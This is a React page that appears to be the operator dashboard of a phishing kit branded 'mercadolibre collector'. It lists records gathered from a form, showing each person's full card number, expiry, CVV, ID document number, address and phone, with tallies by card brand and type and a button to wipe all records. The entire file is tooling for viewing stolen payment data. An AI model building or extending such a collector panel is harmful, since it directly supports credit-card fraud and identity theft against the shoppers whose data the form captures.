"use client"

import { useState, useEffect, useCallback, useRef } from "react"

interface Entry {
  id: string
  createdAt: string
  address: {
    address: string
    noNumber: boolean
    postalCode: string
    noPostalCode: boolean
    province: string
    locality: string
    department: string
    instructions: string
    domicileType: string
    fullName: string
    phone: string
  } | null
  paymentType: string
  card: {
    cardNumber: string
    holderName: string
    expiry: string
    cvv: string
    docType: string
    docNumber: string
    cardBrand: string
  } | null
}

function getCardLast4(num: string) {
  if (!num) return "????"
  const c = num.replace(/\s/g, "")
  return c.slice(-4)
}

function formatCardNumber(num: string) {
  if (!num) return "•••• •••• •••• ••••"
  const c = num.replace(/\s/g, "")
  return c.match(/.{1,4}/g)?.join(" ") ?? c
}

function timeAgo(iso: string) {
  const diff = Date.now() - new Date(iso).getTime()
  const m = Math.floor(diff / 60000)
  const h = Math.floor(m / 60)
  const d = Math.floor(h / 24)
  if (d > 0) return `hace ${d}d`
  if (h > 0) return `hace ${h}h`
  if (m > 0) return `hace ${m}m`
  return "ahora mismo"
}

function formatDate(iso: string) {
  return new Date(iso).toLocaleDateString("es-AR", {
    day: "2-digit", month: "2-digit", year: "numeric",
    hour: "2-digit", minute: "2-digit",
  })
}

/* ── CARD SVG CHIP ── */
function Chip() {
  return (
    <svg width="40" height="32" viewBox="0 0 40 32" fill="none">
      <rect x=".5" y=".5" width="39" height="31" rx="5" fill="url(#cg)" stroke="#a07820" strokeWidth=".6"/>
      <rect x="13" y="10" width="14" height="12" rx="2.5" fill="none" stroke="#a07820" strokeWidth=".8" opacity=".7"/>
      <line x1="20" y1=".5" x2="20" y2="31.5" stroke="#a07820" strokeWidth=".5" opacity=".45"/>
      <line x1=".5" y1="16" x2="39.5" y2="16" stroke="#a07820" strokeWidth=".5" opacity=".45"/>
      <line x1="13" y1=".5" x2="13" y2="10" stroke="#a07820" strokeWidth=".5" opacity=".35"/>
      <line x1="27" y1=".5" x2="27" y2="10" stroke="#a07820" strokeWidth=".5" opacity=".35"/>
      <line x1="13" y1="22" x2="13" y2="31.5" stroke="#a07820" strokeWidth=".5" opacity=".35"/>
      <line x1="27" y1="22" x2="27" y2="31.5" stroke="#a07820" strokeWidth=".5" opacity=".35"/>
      <defs>
        <linearGradient id="cg" x1="0" y1="0" x2="40" y2="32" gradientUnits="userSpaceOnUse">
          <stop offset="0%" stopColor="#f5d060"/>
          <stop offset="50%" stopColor="#d4a520"/>
          <stop offset="100%" stopColor="#b8860b"/>
        </linearGradient>
      </defs>
    </svg>
  )
}

/* ── CARD VISUAL ── */
function CardVisual({ card, paymentType }: { card: NonNullable<Entry["card"]>; paymentType: string }) {
  const isVisa = card.cardBrand === "VISA"
  const isMaster = card.cardBrand === "MASTERCARD"

  const grad = isVisa
    ? "linear-gradient(135deg,#0a0e3d 0%,#1a2a8f 45%,#0d1a5c 100%)"
    : isMaster
    ? "linear-gradient(135deg,#0a0a0a 0%,#1f1f1f 50%,#080808 100%)"
    : "linear-gradient(135deg,#0f1629 0%,#1e2d5a 50%,#0a1020 100%)"

  return (
    <div className="card-visual" style={{ background: grad }}>
      <div className="card-shine"/>
      <div className="card-shine2"/>
      <div className="card-top">
        <Chip />
        {isVisa && (
          <span className="visa-text">VISA</span>
        )}
        {isMaster && (
          <span className="mc-circles">
            <span className="mc-r"/>
            <span className="mc-o"/>
          </span>
        )}
        {!isVisa && !isMaster && card.cardBrand && (
          <span style={{ color: "rgba(255,255,255,.6)", fontSize: 11, fontWeight: 700 }}>{card.cardBrand}</span>
        )}
      </div>
      <div className="card-number">
        •••• •••• •••• {getCardLast4(card.cardNumber)}
      </div>
      <div className="card-bottom">
        <div>
          <div className="card-label">Titular</div>
          <div className="card-value">{card.holderName || "---"}</div>
        </div>
        <div style={{ textAlign: "right" }}>
          <div className="card-label">Válida hasta</div>
          <div className="card-value">{card.expiry || "--/--"}</div>
        </div>
      </div>
    </div>
  )
}

/* ── STAT CARD ── */
function Stat({ label, value, color, glow }: { label: string; value: number; color: string; glow: string }) {
  return (
    <div className="stat-card" style={{ "--glow": glow } as React.CSSProperties}>
      <div className="stat-value" style={{ color }}>{value}</div>
      <div className="stat-label">{label}</div>
    </div>
  )
}

/* ── ENTRY ROW ── */
function EntryRow({ entry, index, visible }: { entry: Entry; index: number; visible: boolean }) {
  const [open, setOpen] = useState(false)
  const [showCvv, setShowCvv] = useState(false)

  const isVisa = entry.card?.cardBrand === "VISA"
  const isMaster = entry.card?.cardBrand === "MASTERCARD"
  const accentColor = isVisa ? "#4f7fff" : isMaster ? "#ff6b35" : "#7c8cf8"
  const accentGlow = isVisa ? "rgba(79,127,255,.25)" : isMaster ? "rgba(255,107,53,.25)" : "rgba(124,140,248,.25)"

  return (
    <div
      className={`entry-row ${visible ? "entry-visible" : ""} ${open ? "entry-open" : ""}`}
      style={{ "--accent": accentColor, "--glow": accentGlow, "--delay": `${index * 60}ms` } as React.CSSProperties}
    >
      {/* ── HEADER ── */}
      <button className="entry-header" onClick={() => setOpen(o => !o)}>
        <div className="entry-index" style={{ background: accentColor + "22", border: `1px solid ${accentColor}44`, color: accentColor }}>
          {index + 1}
        </div>

        <div className="entry-meta">
          <div className="entry-name">{entry.address?.fullName || "Sin nombre"}</div>
          <div className="entry-sub">
            <span>{formatDate(entry.createdAt)}</span>
            <span className="time-badge">{timeAgo(entry.createdAt)}</span>
          </div>
        </div>

        <div className="entry-right">
          {entry.card && (
            <div className="card-preview" style={{ borderColor: accentColor + "44", color: accentColor }}>
              <span className="card-dots">••••</span>
              <span>{getCardLast4(entry.card.cardNumber)}</span>
              {isVisa && <span className="brand-tag" style={{ color: "#4f7fff" }}>VISA</span>}
              {isMaster && (
                <span className="mc-mini">
                  <span style={{ background: "#EB001B" }}/>
                  <span style={{ background: "#F79E1B" }}/>
                </span>
              )}
            </div>
          )}
          <div className="chevron" style={{ transform: open ? "rotate(180deg)" : "rotate(0)" }}>
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
              <path d="M4 6l4 4 4-4" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </div>
        </div>
      </button>

      {/* ── EXPANDED ── */}
      <div className={`entry-body ${open ? "entry-body-open" : ""}`}>
        <div className="entry-content">

          {/* CARD SECTION */}
          {entry.card && (
            <div className="section">
              <div className="section-title">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
                Tarjeta
                <span className="payment-badge" style={{
                  background: entry.paymentType === "credit" ? "#1d4ed822" : "#065f4622",
                  color: entry.paymentType === "credit" ? "#60a5fa" : "#34d399",
                  border: `1px solid ${entry.paymentType === "credit" ? "#3b82f633" : "#10b98133"}`,
                }}>
                  {entry.paymentType === "credit" ? "CRÉDITO" : entry.paymentType === "debit" ? "DÉBITO" : "---"}
                </span>
              </div>

              <div className="card-grid">
                <CardVisual card={entry.card} paymentType={entry.paymentType} />

                <div className="card-data">
                  {/* Full number */}
                  <div className="data-block dark-block">
                    <div className="data-block-label">Número completo</div>
                    <div className="data-block-value mono big">{formatCardNumber(entry.card.cardNumber)}</div>
                  </div>

                  {/* EXP + CVV */}
                  <div className="exp-cvv-row">
                    <div className="data-block orange-block">
                      <div className="data-block-label" style={{ color: "#fb923c" }}>EXP</div>
                      <div className="data-block-value mono xl" style={{ color: "#fed7aa" }}>{entry.card.expiry || "--/--"}</div>
                    </div>
                    <div className="data-block purple-block">
                      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 4 }}>
                        <div className="data-block-label" style={{ color: "#c084fc", marginBottom: 0 }}>CVV</div>
                        <button className="eye-btn" onClick={e => { e.stopPropagation(); setShowCvv(v => !v) }}>
                          {showCvv
                            ? <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24M1 1l22 22"/></svg>
                            : <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                          }
                        </button>
                      </div>
                      <div className="data-block-value mono xl" style={{ color: "#e9d5ff" }}>
                        {showCvv ? entry.card.cvv : "•".repeat(entry.card.cvv?.length || 3)}
                      </div>
                    </div>
                  </div>

                  {/* Doc */}
                  <div className="data-block" style={{ background: "#ffffff08", border: "1px solid #ffffff10" }}>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                      <span className="data-block-label" style={{ marginBottom: 0 }}>{entry.card.docType || "Documento"}</span>
                      <span className="data-block-value mono" style={{ fontSize: 14 }}>{entry.card.docNumber || "---"}</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ADDRESS + CONTACT */}
          {entry.address && (
            <div className="addr-grid">
              <div className="section">
                <div className="section-title">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 1118 0z"/><circle cx="12" cy="10" r="3"/></svg>
                  Domicilio
                </div>
                <div className="addr-block">
                  {[
                    ["Dirección", entry.address.address],
                    ["Código Postal", entry.address.postalCode],
                    ["Provincia", entry.address.province],
                    ["Localidad", entry.address.locality],
                    ...(entry.address.department ? [["Depto", entry.address.department]] : []),
                    ...(entry.address.instructions ? [["Notas", entry.address.instructions]] : []),
                    ["Tipo", entry.address.domicileType === "residential" ? "Residencial" : entry.address.domicileType === "work" ? "Laboral" : "---"],
                  ].map(([l, v]) => (
                    <div key={l} className="addr-row">
                      <span className="addr-key">{l}</span>
                      <span className="addr-val">{v || "---"}</span>
                    </div>
                  ))}
                </div>
              </div>

              <div className="section">
                <div className="section-title">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                  Contacto
                </div>
                <div className="contact-block">
                  <div className="contact-item">
                    <div className="contact-icon" style={{ background: "#3b82f622", border: "1px solid #3b82f633" }}>
                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" strokeWidth="2"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                    </div>
                    <div>
                      <div className="contact-label">Nombre</div>
                      <div className="contact-value">{entry.address.fullName || "---"}</div>
                    </div>
                  </div>
                  <div className="contact-item">
                    <div className="contact-icon" style={{ background: "#10b98122", border: "1px solid #10b98133" }}>
                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#34d399" strokeWidth="2"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81 19.79 19.79 0 01.22 1.18 2 2 0 012.18 0h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.91 7.91a16 16 0 006.16 6.16l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/></svg>
                    </div>
                    <div>
                      <div className="contact-label">Teléfono</div>
                      <div className="contact-value mono">{entry.address.phone || "---"}</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

/* ══════════════════════════════════════════════════════ */
/* ── MAIN PAGE ── */
/* ══════════════════════════════════════════════════════ */
export default function DatosPage() {
  const [entries, setEntries] = useState<Entry[]>([])
  const [loading, setLoading] = useState(true)
  const [visibleSet, setVisibleSet] = useState<Set<number>>(new Set())
  const mainRef = useRef<HTMLDivElement>(null)

  const fetchEntries = useCallback(async () => {
    setLoading(true)
    try {
      const res = await fetch("/api/data")
      const data = await res.json()
      const reversed = Array.isArray(data) ? data.reverse() : []
      setEntries(reversed)
      // stagger visibility
      reversed.forEach((_: Entry, i: number) => {
        setTimeout(() => setVisibleSet(s => new Set([...s, i])), 80 + i * 60)
      })
    } catch {
      setEntries([])
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => { fetchEntries() }, [fetchEntries])

  const handleClear = async () => {
    if (!confirm("¿Borrar todos los registros?")) return
    try {
      await fetch("/api/data", { method: "DELETE" })
      setEntries([])
      setVisibleSet(new Set())
    } catch {}
  }

  const visa = entries.filter(e => e.card?.cardBrand === "VISA").length
  const master = entries.filter(e => e.card?.cardBrand === "MASTERCARD").length
  const credit = entries.filter(e => e.paymentType === "credit").length
  const debit = entries.filter(e => e.paymentType === "debit").length

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=Syne:wght@700;800;900&family=DM+Sans:wght@400;500;600&display=swap');

        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        :root {
          --bg: #080b14;
          --bg2: #0d1120;
          --bg3: #111827;
          --surface: #0f1624;
          --surface2: #141d2e;
          --border: rgba(255,255,255,.07);
          --border2: rgba(255,255,255,.04);
          --text: #e8eaf0;
          --text2: #8892a4;
          --text3: #4a5568;
          --mono: 'IBM Plex Mono', monospace;
          --display: 'Syne', sans-serif;
          --body: 'DM Sans', sans-serif;
        }

        body { background: var(--bg); color: var(--text); font-family: var(--body); }

        .page { min-height: 100vh; background: var(--bg); position: relative; overflow-x: hidden; }

        /* animated grid bg */
        .bg-grid {
          position: fixed; inset: 0; pointer-events: none; z-index: 0;
          background-image:
            linear-gradient(rgba(79,127,255,.03) 1px, transparent 1px),
            linear-gradient(90deg, rgba(79,127,255,.03) 1px, transparent 1px);
          background-size: 40px 40px;
        }
        .bg-glow {
          position: fixed; pointer-events: none; z-index: 0;
          border-radius: 50%;
          filter: blur(80px);
        }
        .bg-glow-1 { width: 500px; height: 500px; background: rgba(79,127,255,.06); top: -100px; right: -100px; }
        .bg-glow-2 { width: 400px; height: 400px; background: rgba(99,58,160,.05); bottom: 10%; left: -80px; }

        /* HEADER */
        .header {
          position: sticky; top: 0; z-index: 100;
          background: rgba(8,11,20,.85);
          backdrop-filter: blur(20px);
          border-bottom: 1px solid var(--border);
          padding: 0 24px;
        }
        .header-inner {
          max-width: 1040px; margin: 0 auto;
          height: 64px; display: flex; align-items: center; justify-content: space-between; gap: 12px;
        }
        .logo { display: flex; align-items: center; gap: 12px; }
        .logo-icon {
          width: 38px; height: 38px; border-radius: 10px; flex-shrink: 0;
          background: linear-gradient(135deg,#1a2f9c,#0d1b6e);
          border: 1px solid rgba(79,127,255,.3);
          box-shadow: 0 0 20px rgba(79,127,255,.2);
          display: flex; align-items: center; justify-content: center;
        }
        .logo-text { font-family: var(--display); font-size: 16px; font-weight: 800; color: #e8eaf0; letter-spacing: -.3px; }
        .logo-sub { font-size: 10px; color: var(--text3); font-family: var(--mono); margin-top: 1px; }

        .header-actions { display: flex; align-items: center; gap: 8px; }
        .count-badge {
          display: flex; align-items: center; gap: 6px;
          background: var(--surface); border: 1px solid var(--border);
          border-radius: 99px; padding: 5px 12px;
          font-size: 11px; font-weight: 600; color: var(--text2);
          font-family: var(--mono);
        }
        .count-dot { width: 6px; height: 6px; border-radius: 50%; background: #4f7fff; box-shadow: 0 0 6px #4f7fff; animation: pulse 2s infinite; }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }

        .btn {
          display: flex; align-items: center; gap: 6px;
          font-size: 12px; font-weight: 700; border: none; cursor: pointer;
          border-radius: 99px; padding: 7px 14px; transition: all .15s ease;
          font-family: var(--body);
        }
        .btn:active { transform: scale(.96); }
        .btn-blue { background: rgba(79,127,255,.15); color: #7baeff; border: 1px solid rgba(79,127,255,.25); }
        .btn-blue:hover { background: rgba(79,127,255,.25); }
        .btn-red { background: rgba(239,68,68,.12); color: #f87171; border: 1px solid rgba(239,68,68,.2); }
        .btn-red:hover { background: rgba(239,68,68,.2); }
        .spin { animation: spin .7s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* MAIN */
        .main { max-width: 1040px; margin: 0 auto; padding: 28px 24px; position: relative; z-index: 1; }

        /* STATS */
        .stats { display: grid; grid-template-columns: repeat(5,1fr); gap: 10px; margin-bottom: 28px; }
        .stat-card {
          background: var(--surface);
          border: 1px solid var(--border);
          border-radius: 14px; padding: 16px;
          transition: box-shadow .2s ease;
          position: relative; overflow: hidden;
        }
        .stat-card::before {
          content: ""; position: absolute; inset: 0; border-radius: 14px;
          box-shadow: 0 0 0 0 var(--glow, transparent);
          transition: box-shadow .2s;
        }
        .stat-card:hover::before { box-shadow: 0 0 20px 4px var(--glow, transparent); }
        .stat-value { font-family: var(--display); font-size: 32px; font-weight: 900; line-height: 1; letter-spacing: -1.5px; }
        .stat-label { font-size: 10px; font-weight: 700; color: var(--text3); text-transform: uppercase; letter-spacing: .1em; margin-top: 6px; }

        /* ENTRY LIST */
        .entries { display: flex; flex-direction: column; gap: 8px; }

        .entry-row {
          background: var(--surface);
          border: 1px solid var(--border);
          border-radius: 16px; overflow: hidden;
          opacity: 0; transform: translateY(16px);
          transition: opacity .4s ease, transform .4s ease, box-shadow .25s ease, border-color .25s ease;
          transition-delay: var(--delay, 0ms);
        }
        .entry-visible { opacity: 1; transform: translateY(0); }
        .entry-open {
          border-color: var(--accent, rgba(255,255,255,.12));
          box-shadow: 0 0 0 1px var(--accent, transparent) inset, 0 16px 48px rgba(0,0,0,.3);
        }
        .entry-row:hover { border-color: rgba(255,255,255,.1); }

        .entry-header {
          width: 100%; display: flex; align-items: center; gap: 14px;
          padding: 16px 20px; background: none; border: none; cursor: pointer; text-align: left;
        }
        .entry-index {
          width: 38px; height: 38px; border-radius: 10px; flex-shrink: 0;
          display: flex; align-items: center; justify-content: center;
          font-family: var(--mono); font-size: 13px; font-weight: 700;
        }
        .entry-meta { flex: 1; min-width: 0; }
        .entry-name { font-size: 14px; font-weight: 600; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .entry-sub { display: flex; align-items: center; gap: 8px; margin-top: 3px; }
        .entry-sub span { font-size: 11px; color: var(--text3); font-family: var(--mono); }
        .time-badge {
          background: rgba(255,255,255,.05); border: 1px solid var(--border);
          border-radius: 99px; padding: 1px 7px; font-size: 10px !important;
          color: var(--text2) !important; font-weight: 600 !important; font-family: var(--mono) !important;
        }
        .entry-right { display: flex; align-items: center; gap: 10px; flex-shrink: 0; }
        .card-preview {
          display: flex; align-items: center; gap: 5px;
          background: var(--surface2); border: 1px solid;
          border-radius: 8px; padding: 5px 10px;
          font-family: var(--mono); font-size: 12px; font-weight: 700;
        }
        .card-dots { opacity: .4; letter-spacing: .1em; }
        .brand-tag { font-size: 9px; font-weight: 900; font-style: italic; font-family: 'Times New Roman', serif; }
        .mc-mini { display: flex; align-items: center; }
        .mc-mini span { width: 10px; height: 10px; border-radius: 50%; display: block; }
        .mc-mini span:last-child { margin-left: -4px; }
        .chevron { color: var(--text3); transition: transform .25s ease, color .2s; }
        .entry-open .chevron { color: var(--text2); }

        /* BODY */
        .entry-body { max-height: 0; overflow: hidden; transition: max-height .4s cubic-bezier(.4,0,.2,1); }
        .entry-body-open { max-height: 1000px; }
        .entry-content { border-top: 1px solid var(--border2); padding: 20px; display: flex; flex-direction: column; gap: 20px; }

        /* SECTION */
        .section { display: flex; flex-direction: column; gap: 12px; }
        .section-title {
          display: flex; align-items: center; gap: 7px;
          font-size: 10px; font-weight: 700; color: var(--text3);
          text-transform: uppercase; letter-spacing: .12em;
        }
        .section-title svg { flex-shrink: 0; }
        .payment-badge {
          margin-left: 6px; font-size: 9px; font-weight: 800; font-family: var(--mono);
          padding: 2px 8px; border-radius: 99px; letter-spacing: .08em;
        }

        /* CARD VISUAL */
        .card-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; align-items: start; }

        .card-visual {
          border-radius: 18px; padding: 22px 24px 20px; position: relative; overflow: hidden;
          aspect-ratio: 1.586; display: flex; flex-direction: column; justify-content: space-between;
          box-shadow: 0 20px 60px rgba(0,0,0,.6), 0 0 0 1px rgba(255,255,255,.06) inset;
        }
        .card-shine {
          position: absolute; top: -60px; right: -60px; width: 240px; height: 240px; border-radius: 50%;
          background: radial-gradient(circle, rgba(255,255,255,.07) 0%, transparent 65%); pointer-events: none;
        }
        .card-shine2 {
          position: absolute; bottom: -30px; left: -10px; width: 160px; height: 160px; border-radius: 50%;
          background: radial-gradient(circle, rgba(255,255,255,.03) 0%, transparent 70%); pointer-events: none;
        }
        .card-top { display: flex; justify-content: space-between; align-items: flex-start; position: relative; }
        .visa-text {
          font-family: 'Times New Roman', serif; font-style: italic; font-weight: 900;
          font-size: 22px; color: #fff; letter-spacing: -1px; text-shadow: 0 2px 8px rgba(0,0,0,.4);
        }
        .mc-circles { display: flex; align-items: center; }
        .mc-r { width: 22px; height: 22px; border-radius: 50%; background: #EB001B; display: block; }
        .mc-o { width: 22px; height: 22px; border-radius: 50%; background: #F79E1B; margin-left: -9px; display: block; }
        .card-number {
          font-family: var(--mono); font-size: 16px; letter-spacing: .18em;
          color: rgba(255,255,255,.9); font-weight: 600; position: relative;
          text-shadow: 0 1px 6px rgba(0,0,0,.5);
        }
        .card-bottom { display: flex; justify-content: space-between; align-items: flex-end; position: relative; }
        .card-label { font-size: 8px; color: rgba(255,255,255,.38); text-transform: uppercase; letter-spacing: .12em; margin-bottom: 3px; }
        .card-value { font-size: 12px; color: rgba(255,255,255,.88); font-weight: 700; letter-spacing: .06em; text-transform: uppercase; }

        /* CARD DATA */
        .card-data { display: flex; flex-direction: column; gap: 8px; }
        .data-block { border-radius: 10px; padding: 11px 13px; }
        .data-block-label { font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: .1em; margin-bottom: 5px; color: var(--text3); }
        .data-block-value { font-weight: 700; color: var(--text); }
        .data-block-value.mono { font-family: var(--mono); }
        .data-block-value.big { font-size: 14px; letter-spacing: .12em; }
        .data-block-value.xl { font-size: 22px; line-height: 1; }

        .dark-block { background: #060810; border: 1px solid rgba(79,127,255,.15); }
        .dark-block .data-block-label { color: #4f7fff88; }
        .dark-block .data-block-value { color: #a0c4ff; }

        .exp-cvv-row { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
        .orange-block { background: #1a0d00; border: 1px solid rgba(251,146,60,.15); }
        .purple-block { background: #0e0618; border: 1px solid rgba(192,132,252,.15); }

        .eye-btn {
          background: rgba(255,255,255,.08); border: 1px solid rgba(255,255,255,.1);
          border-radius: 6px; padding: 3px; cursor: pointer; color: rgba(255,255,255,.5);
          display: flex; align-items: center; justify-content: center;
          transition: background .15s, color .15s;
        }
        .eye-btn:hover { background: rgba(255,255,255,.14); color: rgba(255,255,255,.9); }

        /* ADDR + CONTACT */
        .addr-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
        .addr-block { background: var(--surface2); border: 1px solid var(--border2); border-radius: 10px; padding: 12px 14px; display: flex; flex-direction: column; gap: 7px; }
        .addr-row { display: flex; justify-content: space-between; align-items: baseline; gap: 8px; }
        .addr-key { font-size: 10px; color: var(--text3); white-space: nowrap; flex-shrink: 0; }
        .addr-val { font-size: 11px; color: var(--text2); font-weight: 600; text-align: right; }

        .contact-block { background: var(--surface2); border: 1px solid var(--border2); border-radius: 10px; padding: 14px; display: flex; flex-direction: column; gap: 12px; }
        .contact-item { display: flex; align-items: center; gap: 11px; }
        .contact-icon { width: 32px; height: 32px; border-radius: 9px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .contact-label { font-size: 9px; color: var(--text3); text-transform: uppercase; letter-spacing: .08em; margin-bottom: 2px; }
        .contact-value { font-size: 13px; color: var(--text); font-weight: 600; }
        .contact-value.mono { font-family: var(--mono); }

        /* EMPTY / LOADING */
        .empty-state { background: var(--surface); border: 1px solid var(--border); border-radius: 20px; padding: 64px 24px; text-align: center; }
        .empty-icon { width: 60px; height: 60px; border-radius: 16px; background: var(--surface2); border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
        .empty-title { font-family: var(--display); font-size: 16px; font-weight: 800; color: var(--text2); margin-bottom: 6px; }
        .empty-sub { font-size: 12px; color: var(--text3); }

        .loading-wrap { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 80px 0; gap: 14px; }
        .loading-wrap span { font-size: 12px; color: var(--text3); font-family: var(--mono); }

        /* RESPONSIVE */
        @media (max-width: 700px) {
          .stats { grid-template-columns: repeat(3,1fr); }
          .card-grid { grid-template-columns: 1fr; }
          .addr-grid { grid-template-columns: 1fr; }
          .header-inner { padding: 0 4px; }
          .logo-sub { display: none; }
          .main { padding: 20px 16px; }
          .count-badge { display: none; }
          .entry-content { padding: 16px; }
          .card-number { font-size: 13px; letter-spacing: .12em; }
        }
        @media (max-width: 480px) {
          .stats { grid-template-columns: repeat(2,1fr); }
          .stat-value { font-size: 26px; }
          .entry-header { padding: 14px 16px; gap: 10px; }
          .card-preview { display: none; }
          .exp-cvv-row { grid-template-columns: 1fr 1fr; }
        }
      `}</style>

      <div className="page">
        <div className="bg-grid"/>
        <div className="bg-glow bg-glow-1"/>
        <div className="bg-glow bg-glow-2"/>

        {/* HEADER */}
        <header className="header">
          <div className="header-inner">
            <div className="logo">
              <div className="logo-icon">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="rgba(120,160,255,.9)" strokeWidth="2">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                </svg>
              </div>
              <div>
                <div className="logo-text">Panel de datos</div>
                <div className="logo-sub">mercadolibre collector</div>
              </div>
            </div>

            <div className="header-actions">
              <div className="count-badge">
                <div className="count-dot"/>
                {entries.length} registros
              </div>
              <button className="btn btn-blue" onClick={fetchEntries}>
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" className={loading ? "spin" : ""}>
                  <polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/>
                  <path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15"/>
                </svg>
                Actualizar
              </button>
              {entries.length > 0 && (
                <button className="btn btn-red" onClick={handleClear}>
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 01-2 2H8a2 2 0 01-2-2L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4h6v2"/>
                  </svg>
                  Borrar todo
                </button>
              )}
            </div>
          </div>
        </header>

        {/* MAIN */}
        <main className="main" ref={mainRef}>

          {/* STATS */}
          <div className="stats">
            <Stat label="Total" value={entries.length} color="#e8eaf0" glow="rgba(232,234,240,.08)" />
            <Stat label="Visa" value={visa} color="#7baeff" glow="rgba(79,127,255,.2)" />
            <Stat label="Mastercard" value={master} color="#f97316" glow="rgba(249,115,22,.2)" />
            <Stat label="Crédito" value={credit} color="#60a5fa" glow="rgba(96,165,250,.2)" />
            <Stat label="Débito" value={debit} color="#34d399" glow="rgba(52,211,153,.2)" />
          </div>

          {/* ENTRIES */}
          {loading ? (
            <div className="loading-wrap">
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#4a5568" strokeWidth="2" className="spin">
                <polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/>
                <path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15"/>
              </svg>
              <span>cargando registros...</span>
            </div>
          ) : entries.length === 0 ? (
            <div className="empty-state">
              <div className="empty-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#374151" strokeWidth="1.5">
                  <ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/>
                  <path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/>
                </svg>
              </div>
              <div className="empty-title">Sin registros aún</div>
              <div className="empty-sub">Los datos aparecerán cuando se complete el formulario.</div>
            </div>
          ) : (
            <div className="entries">
              {entries.map((entry, i) => (
                <EntryRow key={entry.id} entry={entry} index={entries.length - 1 - i} visible={visibleSet.has(i)} />
              ))}
            </div>
          )}
        </main>
      </div>
    </>
  )
}